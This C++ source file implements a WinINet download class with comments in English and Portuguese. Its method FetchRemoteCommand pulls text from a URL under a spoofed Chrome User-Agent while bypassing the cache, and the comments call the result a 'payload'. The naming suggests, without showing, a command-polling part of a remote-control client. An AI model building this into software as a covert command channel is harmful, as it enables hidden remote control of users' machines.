#include "DownloadManager.hpp"
#include <iostream>

// --- CONSTRUCTOR & DESTRUCTOR / CONSTRUTOR E DESTRUTOR ---

// Constructor: Initializes the WinINet session with a custom User-Agent string
// Construtor: Inicializa a sessão WinINet com uma string User-Agent customizada
DownloadManager::DownloadManager() : hInternet(nullptr) {
    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
                             INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
}

// Destructor: Safely closes the WinINet session handle if initialized
// Destruidor: Fecha com segurança o handle da sessão WinINet se inicializado
DownloadManager::~DownloadManager() {
    if (hInternet) {
        InternetCloseHandle(hInternet);
    }
}

// --- REMOTE FETCHING LOGIC / LÓGICA DE BUSCA REMOTA ---

// Opens a remote URL via WinINet, reads the response buffer into a string, and closes the connection
// Abre uma URL remota via WinINet, lê o buffer de resposta para uma string e fecha a conexão
std::string DownloadManager::FetchRemoteCommand(const std::string& url) {
    if (!hInternet) return "";

    // Opens the URL directly, forcing a reload and bypassing the local cache
    // Abre a URL diretamente, forçando um recarregamento e ignorando o cache local
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) return "";

    std::string response;
    char buffer[4096];
    DWORD bytesRead = 0;

    // Reads data chunk-by-chunk from the remote resource into the string response
    // Lê os dados em blocos (chunks) do recurso remoto para a resposta em string
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        response.append(buffer, bytesRead);
    }

    // Closes the connection handle and returns the fetched payload
    // Fecha o handle de conexão e retorna o payload buscado
    InternetCloseHandle(hConnect);
    return response;
}